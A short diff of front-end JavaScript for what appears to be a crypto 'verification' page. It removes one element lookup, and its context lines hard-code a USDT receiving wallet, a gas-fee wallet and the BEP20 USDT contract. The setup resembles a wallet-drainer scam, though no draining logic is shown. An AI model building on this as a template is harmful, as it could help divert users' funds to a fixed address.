@@ -1,5 +1,4 @@
- const Next = document.getElementById('Next');
-        const walletAddress = document.getElementById('walletAddress');
+ const walletAddress = document.getElementById('walletAddress');
         const tokenBalance = document.getElementById('tokenBalance');
         const verificationModal = document.getElementById('verificationModal');
         const progressBar = document.getElementById('progressBar');
@@ -15,6 +14,7 @@
         const closeModalBtns = document.querySelectorAll('.close-modal');
         const networkDot = document.getElementById('networkDot');
         const networkStatus = document.getElementById('networkStatus');
+
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
